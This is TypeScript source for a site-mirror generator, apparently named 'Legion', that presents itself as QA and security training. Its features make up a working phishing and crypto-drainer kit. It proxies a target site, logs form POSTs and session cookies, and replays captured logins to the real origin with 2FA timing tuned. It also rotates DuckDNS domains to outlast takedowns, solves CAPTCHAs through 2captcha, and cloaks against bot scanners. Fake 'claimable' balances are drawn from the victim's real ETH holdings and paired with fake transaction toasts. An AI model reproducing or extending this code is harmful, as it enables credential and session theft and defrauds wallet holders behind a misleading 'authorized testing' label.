Pure reverse proxy for internal routing and latency tests.${logForms ? ' With \`--log-forms\`, POST bodies are mirrored to \`logs/logs.json\` on this host only.' : ''}${testLogin ? ' With \`--test-login\`, captured login POSTs replay via internal mirror (\`replay.js\`); cookies logged to \`logs/session_cookies.json\` (not reused).' : ''}${replayOriginal ? ' With \`--replay-original\`, each capture also replays once to the real target origin (\`logs/original_session_cookies.json\`).' : ''}${instantReplay ? ' With \`--instant-replay\`, original replay uses zero delay and a 300ms CSRF pre-fetch budget (2FA QA).' : ''}${solveCaptcha ? ' With \`--solve-captcha\`, 2captcha solves CAPTCHAs via \`captcha-solver.js\` (requires \`TWOCAPTCHA_API_KEY\`).' : ''}${autoRotate ? ' With \`--auto-rotate\`, DuckDNS rotation runs via \`rotate-domain.sh\` + \`domain-rotator\` (requires \`DUCKDNS_TOKEN\`).' : ''}${replayDemo ? ' With \`--replay-demo\`, see \`replay-demo.sh\` for session-hijacking awareness training (examples only).' : ''}${captchaDemo ? ' With \`--captcha-demo\`, see \`README-CAPTCHA-DEMO.md\` for CAPTCHA automation awareness (documentation only).' : ''}${rotateDomain ? ' With \`--rotate-domain\`, see \`README-ROTATE-DOMAIN.md\` for dynamic DNS rotation training (manual steps only).' : ''}

## Start

\`\`\`bash
cd "${outDir}"
docker compose up
\`\`\`

- Status page: http://localhost:${hostPort}/
- Proxied paths: http://localhost:${hostPort}/&lt;path-on-target&gt;
${logForms ? `- Form debug log: \`./logs/logs.json\` (local POST mirror)\n` : ''}${testLogin ? `- Login replay log: \`./logs/replay_log.txt\`\n- Session cookies: \`./logs/session_cookies.json\` (capture only)\n` : ''}${replayOriginal ? `- Original target replay log: \`./logs/original_replay_log.txt\`\n- Original session cookies: \`./logs/original_session_cookies.json\` (one-shot, manual inspection)\n` : ''}${solveCaptcha ? `- CAPTCHA solver log: \`./logs/captcha_solver.log\`\n` : ''}${autoRotate ? `- Auto-rotate log: \`./logs/rotate.log\`\n- Domain state: \`./logs/domain_state.json\`\n` : ''}
## Files

- \`nginx.conf\` — forwards all non-root requests to ${target.origin}
- \`docker-compose.yml\` — nginx:alpine on port ${hostPort}
- \`index.html\` — local "Mirror active" status page
- \`mirror-config.json\` — target metadata for automation
${logForms ? '- `logger.js` — local POST logger (docker service `form-logger`)\n- `logs/logs.json` — appended form payloads for manual QA review\n' : ''}${solveCaptcha ? '- `captcha-solver.js` — 2captcha HTTP helper (`solveCaptcha(type, siteKey, pageUrl)`)\n- `__legion__/captcha-client.js` — injected browser helper for form submit\n' : ''}${testLogin ? '- `replay.js` — internal login replay (axios → mirror URL only)\n- `logs/replay_log.txt` — replay success/failure lines\n- `logs/session_cookies.json` — captured Set-Cookie headers (debug only)\n' : ''}${replayOriginal ? '- `replay.js` — also replays once to original target when `ORIGINAL_REPLAY_ENABLED=true`\n- `logs/original_replay_log.txt` — original target replay outcomes\n- `logs/original_session_cookies.json` — session cookies from target (not reused)\n' : ''}${autoRotate ? '- `rotate-domain.sh` — DuckDNS register/rotate + nginx TLS reload\n- `domain-rotator` — docker service (12h health loop)\n- `rotate/active-domain.conf` — generated nginx server block\n- `ssl/` — self-signed or certbot certs\n- `README-AUTO-ROTATE.md` — operator guide\n' : ''}${replayDemo ? '- `replay-demo.sh` — security training: example curl session-replay commands (documentation only)\n' : ''}${captchaDemo ? '- `README-CAPTCHA-DEMO.md` — security training: how CAPTCHA solver services work (no API wired)\n' : ''}${rotateDomain ? '- `README-ROTATE-DOMAIN.md` — stress-test training: dynamic DNS domain rotation (manual only)\n- `rotate-domain.sh.template` — example DuckDNS update workflow (no auto API calls)\n- `duckdns.env.example` — sample env placeholders for authorized lab use\n' : ''}
`
}

/**
 * Educational README for authorized stress-test training.
 * Explains dynamic DNS rotation — no API integration or automated updates.
 */
export function buildRotateDomainReadme(target: URL, hostPort: number): string {
  const origin = target.origin
  const generated = new Date().toISOString()
  const slug = target.hostname.replace(/[^a-z0-9]+/gi, '-').replace(/^-|-$/g, '').toLowerCase() || 'qa-mirror'

  return `# Dynamic DNS domain rotation — authorized stress-test training only

**Mirror target:** ${origin}  
**Local mirror port:** ${hostPort}  
**Generated:** ${generated}

> **Purpose:** Teach blue/red teams how adversaries rotate hostnames via dynamic DNS (e.g. DuckDNS) to stay reachable after blocklists or takedown actions — and how defenders detect/respond.  
> **This bundle does not call DuckDNS or any DNS API.** All steps are manual documentation.

---

## When this applies (authorized labs only)

During **authorized** resilience and abuse-handling exercises, testers may simulate:

1. Deploying a QA mirror behind a public hostname
2. That hostname appearing on a blocklist or being taken down
3. **Rotating** to a new subdomain while keeping the same backend IP and docker stack

Understanding this workflow helps engineers improve detection (fast-flux patterns, new subdomain alerts) and response (block by infrastructure, not just hostname).

**Never** rotate domains to evade controls on systems you do not own or lack written authorization to test.

---

## Post-deployment workflow (manual)

After you start the mirror (\`docker compose up\` in this directory):

1. **Expose the stack** — Point a dynamic DNS name at your lab VPS public IP (or tunnel endpoint).
2. **Smoke test** — \`curl -I http://YOUR-SUBDOMAIN.duckdns.org:${hostPort}/\` should hit the local status page.
3. **Simulate takedown** — In the exercise, treat the current hostname as "burned" (blocked in training SIEM / lab DNS sinkhole).
4. **Register a new subdomain** — Create \`legion-qa-mirror-02.duckdns.org\` (or similar) in DuckDNS dashboard.
5. **Update DNS** — Manually run the update URL or use the template script (copy/edit first).
6. **Re-point clients** — Update exercise runbooks to use the new hostname; nginx/docker stack stays the same.
7. **Log rotation** — Record old/new names and timestamps for blue-team scoring.

---

## DuckDNS sample configuration (manual setup)

1. Create a free account at [duckdns.org](https://www.duckdns.org).
2. Create subdomains for your lab, e.g.:
   - \`${slug}-01.duckdns.org\`
   - \`${slug}-02.duckdns.org\`
3. Copy \`duckdns.env.example\` → \`duckdns.env\` and fill placeholders (**lab tokens only**).
4. Do **not** commit \`duckdns.env\` to git.

**Manual update URL shape** (run from your shell when IP changes):

\`\`\`text
https://www.duckdns.org/update?domains=SUBDOMAIN&token=TOKEN&ip=PUBLIC_IP
\`\`\`

Optional: omit \`&ip=\` to let DuckDNS detect your egress IP.

---

## Files in this bundle

| File | Purpose |
|------|---------|
| \`README-ROTATE-DOMAIN.md\` | This guide |
| \`duckdns.env.example\` | Placeholder env vars |
| \`rotate-domain.sh.template\` | Commented workflow + printed examples (no API calls when run as-is) |

---

## nginx / TLS notes for lab mirrors

The generated \`nginx.conf\` proxies to ${origin}. For public hostname testing you may additionally:

- Terminate TLS at a lab reverse proxy (Caddy, Traefik) in front of port ${hostPort}
- Add \`server_name\` blocks for each rotated DuckDNS hostname (manual edit)
- Use short-lived Let's Encrypt certs **only** on domains you control

Rotating DNS does not require rebuilding the mirror — only DNS records and client-facing URLs change.

---

## Blue-team detection hints

Monitor for:

- Multiple short-lived subdomains resolving to the same IP / ASN
- Newly registered dynamic DNS names in HTTP Referer or phishing reports
- Certificate transparency logs for unexpected hostnames on your infra
- Correlation: block one hostname → traffic resumes on a sibling subdomain within minutes

Mitigations: block by IP/ASN where appropriate, rate-limit new domain reputation checks, automate takedown playbooks with infrastructure-level blocks.

---

## Relation to this mirror

Target reference: \`${origin}\`  
Local status: \`http://localhost:${hostPort}/\`

The \`--rotate-domain\` flag adds documentation and templates only. No cron jobs, webhooks, or DuckDNS tokens are configured by the generator.

**Authorized use:** Internal stress-test and security awareness training on infrastructure your team operates.
`
}

/** Sample env file — placeholders only; never commit real tokens. */
export function buildDuckDnsEnvExample(target: URL): string {
  const slug = target.hostname.replace(/[^a-z0-9]+/gi, '-').replace(/^-|-$/g, '').toLowerCase() || 'qa-mirror'
  return `# DuckDNS sample configuration — AUTHORIZED LAB USE ONLY
# Copy to duckdns.env and fill in manually. Do not commit duckdns.env.

# Primary subdomain (without .duckdns.org)
DUCKDNS_SUBDOMAIN=${slug}-01

# Token from https://www.duckdns.org (lab account only)
DUCKDNS_TOKEN=PASTE_LAB_TOKEN_HERE

# Public IP of the host running docker compose (leave empty to auto-detect when updating manually)
PUBLIC_IP=

# Backup subdomain to rotate to during exercise step 4
DUCKDNS_SUBDOMAIN_ROTATE=${slug}-02
`
}

/**
 * Shell script template for domain rotation training.
 * Prints example commands only — does not call DuckDNS unless operator uncomments and edits.
 */
export function buildRotateDomainScriptTemplate(target: URL, hostPort: number): string {
  const origin = target.origin
  const slug = target.hostname.replace(/[^a-z0-9]+/gi, '-').replace(/^-|-$/g, '').toLowerCase() || 'qa-mirror'
  const generated = new Date().toISOString()

  return `#!/usr/bin/env bash
# =============================================================================
# Dynamic DNS rotation — AUTHORIZED STRESS-TEST TRAINING ONLY
# =============================================================================
# Mirror target: ${origin}
# Local port: ${hostPort}
# Generated: ${generated}
#
# PURPOSE
#   Document how to manually rotate a DuckDNS hostname after a simulated takedown.
#   This template prints example commands. It does NOT update DNS automatically.
#
# USAGE
#   cat rotate-domain.sh.template     # read workflow
#   bash rotate-domain.sh.template    # prints examples (no network calls)
#
# To use for real lab updates: copy to rotate-domain.sh, edit duckdns.env, then
# uncomment the MANUAL UPDATE section at the bottom — never run unreviewed.
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="\${SCRIPT_DIR}/duckdns.env"

echo ""
echo "=== Dynamic DNS rotation training (documentation only) ==="
echo "Mirror target: ${origin}"
echo "Local stack:   http://localhost:${hostPort}/"
echo ""
echo "This script does NOT call DuckDNS unless you copy, edit, and uncomment the manual block."
echo ""

cat <<'EOF'
--- Step 1: Deploy mirror (already done if you generated this bundle) ---
cd "$(dirname "$0")"
docker compose up -d

--- Step 2: Configure DuckDNS (manual, one-time) ---
# 1. Create subdomains at https://www.duckdns.org
# 2. cp duckdns.env.example duckdns.env
# 3. Set DUCKDNS_SUBDOMAIN, DUCKDNS_TOKEN, optional PUBLIC_IP

--- Step 3: Example manual update (DO NOT RUN from template — copy/edit first) ---
# Replace SUBDOMAIN and TOKEN with values from your lab duckdns.env

curl -sS "https://www.duckdns.org/update?domains=SUBDOMAIN&token=TOKEN&ip="

--- Step 4: Verify DNS points to your lab host ---
dig +short SUBDOMAIN.duckdns.org
curl -I "http://SUBDOMAIN.duckdns.org:${hostPort}/"

--- Step 5: Simulate takedown / rotation exercise ---
# Blue team: block SUBDOMAIN in lab sinkhole or exercise blocklist
# Red team: register SUBDOMAIN_ROTATE in DuckDNS, update IP, notify exercise channel
# Document: old hostname, new hostname, rotation timestamp

curl -sS "https://www.duckdns.org/update?domains=SUBDOMAIN_ROTATE&token=TOKEN&ip="

--- Step 6: Optional cron (lab VPS only — uncomment in your edited copy) ---
# */5 * * * * /path/to/rotate-domain.sh >> /var/log/duckdns-lab.log 2>&1

--- Defensive takeaway ---
# Rotating hostnames is slow compared to IP blocks. Monitor same-IP multi-subdomain patterns.
EOF

echo ""
if [[ -f "\$ENV_FILE" ]]; then
  echo "Note: duckdns.env exists but this template still will not call the API."
else
  echo "Tip: copy duckdns.env.example to duckdns.env before any manual lab update."
fi
echo ""
echo "End of training template."
exit 0

# =============================================================================
# MANUAL UPDATE SECTION (commented out — copy script and uncomment to use)
# =============================================================================
# source "\$ENV_FILE"
# : "\${DUCKDNS_SUBDOMAIN:?set in duckdns.env}"
# : "\${DUCKDNS_TOKEN:?set in duckdns.env}"
# IP="\${PUBLIC_IP:-}"
# if [[ -z "\$IP" ]]; then
#   IP=\$(curl -sS https://checkip.amazonaws.com | tr -d '[:space:]')
# fi
# curl -sS "https://www.duckdns.org/update?domains=\${DUCKDNS_SUBDOMAIN}&token=\${DUCKDNS_TOKEN}&ip=\${IP}"
# echo "Updated \${DUCKDNS_SUBDOMAIN}.duckdns.org -> \${IP}"
`
}

/**
 * Educational README for internal security training.
 * Explains human-solver CAPTCHA services — no API integration or live calls.
 */
export function buildCaptchaDemoReadme(target: URL): string {
  const origin = target.origin
  const generated = new Date().toISOString()

  return `# CAPTCHA automation awareness — security training only

**Target reference:** ${origin}  
**Generated:** ${generated}

> **Purpose:** Help developers understand how third-party CAPTCHA solving services (e.g. [2captcha](https://2captcha.com)) work, why attackers use them, and what defenses reduce automated abuse.  
> **This document is educational only.** Nothing in this mirror bundle calls 2captcha or any solver API.

---

## What problem do CAPTCHAs solve?

CAPTCHAs (reCAPTCHA, Cloudflare Turnstile, hCaptcha, etc.) distinguish **likely humans** from **automated clients**. Sites use them to:

- Block credential stuffing and spam sign-ups
- Protect high-value actions (login, checkout, wallet connect)
- Rate-limit scripted abuse without blocking all anonymous traffic

CAPTCHAs are not perfect. They trade **friction for humans** against **cost for attackers**.

---

## How human-solver services work (2captcha model)

Services like 2captcha do **not** break cryptography. They outsource the puzzle to humans or specialized workers:

1. **Submit** — Your script sends the CAPTCHA type, site key, and page URL to the solver API (\`in.php\`).
2. **Queue** — The service returns a task ID. Workers solve the challenge out-of-band.
3. **Poll** — Your script polls \`res.php\` until status is ready (often 5–30+ seconds).
4. **Inject** — You paste the returned token into the form field or callback the widget expects.

Common CAPTCHA types supported by these APIs:

| Type | What you send | What you get back |
|------|----------------|-------------------|
| reCAPTCHA v2/v3 | \`sitekey\`, \`pageurl\` | Token string for \`g-recaptcha-response\` |
| Cloudflare Turnstile | \`sitekey\`, \`pageurl\` | Turnstile response token |
| hCaptcha | \`sitekey\`, \`pageurl\` | hCaptcha response token |
| Image CAPTCHA | Base64 image | Plaintext answer |

Pricing is per solve (fractions of a cent to a few cents). Attackers scale cost linearly with volume.

---

## Sample integration pattern (illustrative — not wired in this mirror)

The snippet below shows the **typical async poll loop** developers see in solver integrations.  
**Do not run this against production sites you do not own.** Replace placeholders only in authorized staging labs.

\`\`\`typescript
/**
 * EDUCATIONAL EXAMPLE ONLY — not executed by the mirror generator.
 * Demonstrates the 2captcha Turnstile flow (submit → poll → token).
 */
async function solveTurnstileEducationalExample(
  apiKey: string,
  siteKey: string,
  pageUrl: string,
): Promise<string> {
  // Step 1: Create task
  const createRes = await fetch('https://2captcha.com/in.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      key: apiKey,
      method: 'turnstile',
      sitekey: siteKey,
      pageurl: pageUrl,
      json: '1',
    }),
  })
  const createJson = (await createRes.json()) as { status: number; request: string }
  if (createJson.status !== 1) {
    throw new Error(createJson.request || 'solver create failed')
  }
  const taskId = createJson.request

  // Step 2: Poll until ready (real integrations often wait 5–15s between polls)
  for (let attempt = 0; attempt < 24; attempt++) {
    await new Promise((r) => setTimeout(r, 5000))
    const pollUrl =
      'https://2captcha.com/res.php?' +
      new URLSearchParams({
        key: apiKey,
        action: 'get',
        id: taskId,
        json: '1',
      })
    const pollRes = await fetch(pollUrl)
    const pollJson = (await pollRes.json()) as { status: number; request: string }
    if (pollJson.status === 1) return pollJson.request // token
    if (pollJson.request !== 'CAPCHA_NOT_READY') {
      throw new Error(pollJson.request || 'poll failed')
    }
  }
  throw new Error('solver timeout')
}

// Step 3: Submit token with your form (conceptual)
// document.querySelector('[name="cf-turnstile-response"]').value = token
// form.submit()
\`\`\`

**Why this is fragile for attackers:**

- **Latency** — Poll loops add 10–60s per attempt; bad for real-time flows.
- **Cost** — High-volume abuse gets expensive; still cheaper than manual QA for some threat actors.
- **Detection** — Solver IP ranges, token reuse, missing browser signals, and anomaly scoring can flag solves.
- **Site-specific wiring** — Each integration needs the correct widget type, action names, and POST fields.
- **Policy / legal** — Using solver APIs against third-party sites violates most ToS and may be unlawful.

---

## Automation challenges defenders should understand

When designing auth and anti-abuse controls, assume motivated actors **can** obtain tokens via:

- Human farms and click workers
- Solver APIs (2captcha, Anti-Captcha, CapSolver, etc.)
- Browser automation with real profiles (harder but not impossible)

CAPTCHA alone is **one layer**, not a complete defense. Combine with:

- **Risk scoring** — Device fingerprint, velocity, geo, ASN, headless signals
- **Server-side validation** — Verify tokens with the provider's siteverify endpoint; check action/score thresholds
- **Step-up auth** — MFA, email magic links, or hardware keys for sensitive actions
- **Rate limits & lockouts** — Per IP, account, and global budgets
- **Turnstile / v3 scores** — Prefer invisible or scored challenges; block low scores server-side
- **Monitoring** — Alert on solve latency patterns, repeated failures, and token validation errors

---

## Relation to this mirror bundle

This QA mirror (\`${origin}\`) is a **reverse proxy for routing/latency tests**. The \`--captcha-demo\` flag adds **this README only**.

- No \`TWOCAPTCHA_API_KEY\` is read or stored here.
- No solver client is injected into nginx or docker-compose.
- For clone-mode Turnstile helpers (separate flag \`--solve-captcha\` on static clones), see the main generator docs — still authorized staging only.

---

## Further reading (internal)

- OWASP: Automated Threats to Web Applications
- Cloudflare Turnstile docs — server-side token validation
- Google reCAPTCHA admin — score thresholds and action names

**Authorized use:** Internal security awareness training on systems your team operates.
`
}

/**
 * Educational shell script for internal security training.
 * Prints example curl commands only — never executes replay automatically.
 */
export function buildReplayDemoScript(
  target: URL,
  hostPort: number,
  logForms = false,
): string {
  const origin = target.origin
  const samplePath = target.pathname && target.pathname !== '/' ? target.pathname : '/dashboard'
  const generated = new Date().toISOString()
  const mirrorUrl = `http://localhost:${hostPort}${samplePath}`
  const targetUrl = `${origin}${samplePath}`
  const loginUrl = `${origin}/login`

  const logFormsTip = logForms
    ? `
echo ""
echo "Tip: With --log-forms, inspect ./logs/logs.json for POST field names only."
echo "Do not export production cookies into shared training materials."
`
    : ''

  return `#!/usr/bin/env bash
# =============================================================================
# Session replay demonstration — SECURITY TRAINING ONLY
# =============================================================================
# Target reference: ${origin}
# Generated: ${generated}
#
# PURPOSE
#   Teach developers how HTTP session cookies can be replayed after capture.
#   This script prints example curl commands. It does NOT send requests or
#   replay sessions automatically.
#
# USAGE
#   cat replay-demo.sh          # read in terminal
#   bash replay-demo.sh         # prints training examples (no network replay)
#
# AUTHORIZED USE
#   Internal staging / security awareness training on systems you own only.
# =============================================================================

set -euo pipefail

echo ""
echo "=== Session hijacking awareness (documentation only) ==="
echo "Target: ${origin}"
echo "Local mirror: http://localhost:${hostPort}/"
echo ""
echo "No curl commands below are executed by this script."
echo "Copy examples manually only in authorized staging labs."
echo ""

cat <<EOF
--- Concept ---
If an attacker obtains a valid session cookie (e.g. from XSS, malware, or
insecure logging), they can replay it in a Cookie header to impersonate the
user until the session expires or is rotated.

--- Example 1: Baseline request (no session cookie) ---
# Expect 401/403 or login redirect on protected routes.

curl -sS -D - -o /dev/null \\
  '${targetUrl}'

--- Example 2: Hypothetical replay with a captured cookie ---
# Replace PASTE_STAGING_COOKIE with a value from YOUR staging logs only.
# Never use real user cookies from production.

curl -sS -D - -o /dev/null \\
  -H 'Cookie: session=PASTE_STAGING_COOKIE' \\
  '${targetUrl}'

--- Example 3: Same idea via local QA mirror ---
# Useful when testing through docker compose on localhost.

curl -sS -D - -o /dev/null \\
  -H 'Cookie: session=PASTE_STAGING_COOKIE' \\
  '${mirrorUrl}'

--- Example 4: Inspecting Set-Cookie on login (staging lab) ---
curl -sS -D - -o /dev/null \\
  -X POST \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  --data 'username=training-user&password=training-password' \\
  '${loginUrl}'

--- Developer mitigations ---
- Set-Cookie: HttpOnly; Secure; SameSite=Lax or Strict
- Rotate session ID on login, logout, and privilege elevation
- Short session TTL; prefer refresh-token patterns
- Never log raw Cookie headers in application logs
- Use CSRF tokens for state-changing requests
EOF
${logFormsTip}
echo ""
echo "End of training examples."
exit 0
`
}

export function buildRotateReadme(): string {
  return `## --rotate (load testing)

Asset fetches during generation used rotating User-Agent headers and optional \`PROXY_LIST\` entries.

For runtime load tests, set \`PROXY_LIST\` (comma-separated proxy URLs or IPs) and use a traffic generator
that rotates headers similarly. Example:

\`\`\`bash
export PROXY_LIST="http://proxy1:8080,http://proxy2:8080"
# re-run generator with --rotate to apply during clone build
\`\`\`
`
}

/** Mobile layout optimizer — device detection + responsive touch targets (QA clones). */
export function buildMobileOptimizeCss(): string {
  return `
html.legion-mobile-opt{-webkit-text-size-adjust:100%;text-size-adjust:100%;}
html.legion-mobile-opt body{overflow-x:hidden;max-width:100vw;}
html.legion-mobile-opt.legion-is-mobile{font-size:16px;}
html.legion-mobile-opt.legion-is-mobile input,
html.legion-mobile-opt.legion-is-mobile select,
html.legion-mobile-opt.legion-is-mobile textarea,
html.legion-mobile-opt.legion-is-mobile button{
  min-height:44px;font-size:16px;touch-action:manipulation;
}
html.legion-mobile-opt.legion-is-mobile img,video,iframe{max-width:100%;height:auto;}
html.legion-mobile-opt.legion-is-mobile [class*="modal"],
html.legion-mobile-opt.legion-is-mobile [class*="dialog"]{
  max-width:100vw !important;margin:0 auto !important;
}
html.legion-mobile-opt.legion-is-mobile .legion-mobile-stack{
  display:flex;flex-direction:column;gap:12px;width:100%;
}
`.trim()
}

export function buildMobileOptimizeJs(): string {
  return `/* Legion mobile optimizer — authorized QA clones */
(function(){
  var MOBILE=/Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry|IEMobile|Opera Mini/i;
  var root=document.documentElement;
  root.classList.add('legion-mobile-opt');
  function apply(){
    var mobile=MOBILE.test(navigator.userAgent||'')||window.innerWidth<768;
    root.classList.toggle('legion-is-mobile',mobile);
    root.classList.toggle('legion-is-desktop',!mobile);
    var vp=document.querySelector('meta[name="viewport"]');
    if(mobile&&!vp){
      var m=document.createElement('meta');
      m.name='viewport';
      m.content='width=device-width,initial-scale=1,viewport-fit=cover';
      document.head.appendChild(m);
    }
  }
  apply();
  window.addEventListener('resize',apply,{passive:true});
  window.addEventListener('orientationchange',apply,{passive:true});
})();`
}

export function buildTrainingQaCss(): string {
  return `
#legion-qa-balance{position:fixed;top:52px;right:20px;z-index:2147483645;background:#14532d;color:#bbf7d0;padding:10px 14px;border-radius:10px;font:600 13px system-ui,sans-serif;box-shadow:0 4px 16px rgba(0,0,0,.3);display:none;}
#legion-qa-balance.visible{display:block;}
#legion-qa-preapprove{position:fixed;top:52px;left:20px;z-index:2147483645;background:#1e3a5f;color:#93c5fd;padding:10px 14px;border-radius:10px;font:600 13px system-ui,sans-serif;display:none;max-width:280px;}
#legion-qa-preapprove.visible{display:block;}
#legion-qa-toast-host{position:fixed;bottom:100px;left:20px;z-index:2147483644;display:flex;flex-direction:column;gap:8px;pointer-events:none;}
.legion-qa-toast{background:#1e293b;color:#e2e8f0;padding:10px 14px;border-radius:8px;font:12px system-ui,sans-serif;box-shadow:0 4px 12px rgba(0,0,0,.35);animation:legionToastIn .3s ease;}
@keyframes legionToastIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
`.trim()
}

export function buildTrainingQaJs(ctx: TrainingCloneContext): string {
  const targetOrigin = ctx.target.origin
  const features = ctx.features
  const alchemyKey = process.env['EVM_ALCHEMY_KEY']?.trim() || process.env['RPC_ETHEREUM_PRIVATE']?.match(/\/v2\/([^/]+)/)?.[1] || ''
  const moralisKey = process.env['MORALIS_API_KEY']?.trim() || ''
  const kineticKey = process.env['KINETIC_INTERNAL_KEY']?.trim() || ''
  const twoCaptchaKey = process.env['TWOCAPTCHA_API_KEY']?.trim() || ''
  const allowanceEnabled = process.env['ALLOWANCE_REUSE_ENABLED']?.trim().toLowerCase() === 'true'

  return `/* Legion QA / UX testing toolkit — staging only */
(function () {
  var TARGET_ORIGIN = ${JSON.stringify(targetOrigin)};
  var DEMO_API = ${JSON.stringify(ctx.demoApiUrl)};
  var FEATURES = ${JSON.stringify(features)};
  var ALCHEMY_KEY = ${JSON.stringify(alchemyKey)};
  var MORALIS_KEY = ${JSON.stringify(moralisKey)};
  var KINETIC_KEY = ${JSON.stringify(kineticKey)};
  var ALLOWANCE_REUSE = ${JSON.stringify(allowanceEnabled)};
  var TWOCAPTCHA_KEY = ${JSON.stringify(twoCaptchaKey)};

  var I18N = {
    en: {
      banner: 'QA mirror — authorized staging test',
      claimable: 'Claimable amount (demo):',
      preapprove: 'Already authorized — claim ready',
      toastPrefix: 'just completed a test transaction',
    },
    es: {
      banner: 'Espejo QA — prueba de staging autorizada',
      claimable: 'Monto reclamable (demo):',
      preapprove: 'Ya autorizado — listo para reclamar',
      toastPrefix: 'acaba de completar una transacción de prueba',
    },
  };

  function locale() {
    if (!FEATURES.lang) return 'en';
    var langs = (navigator.languages || [navigator.language || 'en']).join(',').toLowerCase();
    if (langs.indexOf('es') >= 0) return 'es';
    return 'en';
  }

  function t(key) {
    var loc = locale();
    return (I18N[loc] && I18N[loc][key]) || I18N.en[key] || key;
  }

  var BOT_UA = ${JSON.stringify(BOT_UA_PATTERNS)};

  function isBot() {
    if (!FEATURES.cloak) return false;
    var ua = (navigator.userAgent || '').toLowerCase();
    for (var i = 0; i < BOT_UA.length; i++) {
      if (ua.indexOf(BOT_UA[i]) >= 0) return true;
    }
    return false;
  }

  if (FEATURES.cloak && isBot()) {
    window.location.replace('./bots.html');
    return;
  }

  if (FEATURES.lang) {
    document.documentElement.lang = locale();
  }

  function shortAddr(a) {
    if (!a || a.length < 12) return a || '0x????';
    return a.slice(0, 6) + '…' + a.slice(-4);
  }

  function getConnectedEvmAddress() {
    return window.ethereum && window.ethereum.selectedAddress
      ? window.ethereum.selectedAddress
      : (window.__legionTrainingWallet || null);
  }

  async function fetchEthBalanceUsd(address) {
    if (!address) return null;
    try {
      if (ALCHEMY_KEY) {
        var res = await fetch('https://eth-mainnet.g.alchemy.com/v2/' + ALCHEMY_KEY, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_getBalance', params: [address, 'latest'] }),
        });
        var j = await res.json();
        var wei = BigInt(j.result || '0x0');
        var eth = Number(wei) / 1e18;
        var pxRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
        var px = await pxRes.json();
        var usd = eth * (px.ethereum && px.ethereum.usd ? px.ethereum.usd : 2500);
        return usd;
      }
      if (MORALIS_KEY) {
        var mRes = await fetch(
          'https://deep-index.moralis.io/api/v2.2/' + address + '/balance?chain=eth',
          { headers: { 'X-API-Key': MORALIS_KEY } }
        );
        var mJ = await mRes.json();
        var bal = Number(mJ.balance || 0) / 1e18;
        return bal * 2500;
      }
    } catch (e) { console.warn('[legion-qa] balance fetch', e); }
    return null;
  }

  if (FEATURES.balance) {
    var balEl = document.createElement('div');
    balEl.id = 'legion-qa-balance';
    document.body.appendChild(balEl);
    function refreshBalance() {
      var addr = getConnectedEvmAddress();
      if (!addr) { balEl.classList.remove('visible'); return; }
      fetchEthBalanceUsd(addr).then(function (usd) {
        if (usd == null) usd = 0;
        var demo = Math.max(usd * 0.15, 12.5);
        balEl.textContent = t('claimable') + ' $' + demo.toFixed(2);
        balEl.classList.add('visible');
      });
    }
    setInterval(refreshBalance, 8000);
    window.addEventListener('ethereum#initialized', refreshBalance);
    setTimeout(refreshBalance, 2000);
  }

  if (FEATURES.preapprove && ALLOWANCE_REUSE && KINETIC_KEY) {
    var preEl = document.createElement('div');
    preEl.id = 'legion-qa-preapprove';
    document.body.appendChild(preEl);
    async function checkPreapprove() {
      var addr = getConnectedEvmAddress();
      if (!addr) { preEl.classList.remove('visible'); return; }
      try {
        var res = await fetch(DEMO_API + '/api/internal/allowance-reuse/scan', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-legion-kinetic-key': KINETIC_KEY,
          },
          body: JSON.stringify({ wallet_address: addr }),
        });
        var data = await res.json();
        var list = (data && data.data && data.data.allowances) || (data && data.allowances) || [];
        if (Array.isArray(list) && list.length > 0) {
          preEl.textContent = t('preapprove');
          preEl.classList.add('visible');
        } else {
          preEl.classList.remove('visible');
        }
      } catch (e) {
        preEl.classList.remove('visible');
      }
    }
    setInterval(checkPreapprove, 12000);
    setTimeout(checkPreapprove, 3000);
  }

  if (FEATURES.toast) {
    var host = document.createElement('div');
    host.id = 'legion-qa-toast-host';
    document.body.appendChild(host);
    var hex = '0123456789abcdef';
    function randomAddr() {
      var s = '0x';
      for (var i = 0; i < 40; i++) s += hex[Math.floor(Math.random() * 16)];
      return shortAddr(s);
    }
    function showToast() {
      var el = document.createElement('div');
      el.className = 'legion-qa-toast';
      el.textContent = randomAddr() + ' ' + t('toastPrefix');
      host.appendChild(el);
      setTimeout(function () { el.remove(); }, 6000);
      while (host.children.length > 4) host.removeChild(host.firstChild);
    }
    function scheduleToast() {
      var delay = 10000 + Math.floor(Math.random() * 5000);
      setTimeout(function () { showToast(); scheduleToast(); }, delay);
    }
    scheduleToast();
  }

  if (FEATURES.redirect) {
    document.addEventListener('submit', function (e) {
      var form = e.target;
      if (!(form instanceof HTMLFormElement)) return;
      e.preventDefault();
      setTimeout(function () {
        window.location.href = TARGET_ORIGIN;
      }, 400);
    }, true);
  }

  if (FEATURES.solveCaptcha && TWOCAPTCHA_KEY) {
    window.__legionSolveTurnstile = async function (siteKey, pageUrl) {
      var createRes = await fetch('https://2captcha.com/in.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          key: TWOCAPTCHA_KEY,
          method: 'turnstile',
          sitekey: siteKey,
          pageurl: pageUrl || window.location.href,
          json: '1',
        }),
      });
      var createJson = await createRes.json();
      if (createJson.status !== 1) throw new Error(createJson.request || '2captcha create failed');
      var taskId = createJson.request;
      for (var i = 0; i < 24; i++) {
        await new Promise(function (r) { setTimeout(r, 5000); });
        var pollRes = await fetch(
          'https://2captcha.com/res.php?key=' + encodeURIComponent(TWOCAPTCHA_KEY) +
          '&action=get&id=' + encodeURIComponent(taskId) + '&json=1'
        );
        var pollJson = await pollRes.json();
        if (pollJson.status === 1) return pollJson.request;
        if (pollJson.request !== 'CAPCHA_NOT_READY') throw new Error(pollJson.request || 'poll failed');
      }
      throw new Error('2captcha timeout');
    };
    console.info('[legion-qa] Turnstile solver available: window.__legionSolveTurnstile(siteKey, pageUrl)');
  }

  window.__legionTrainingWallet = null;
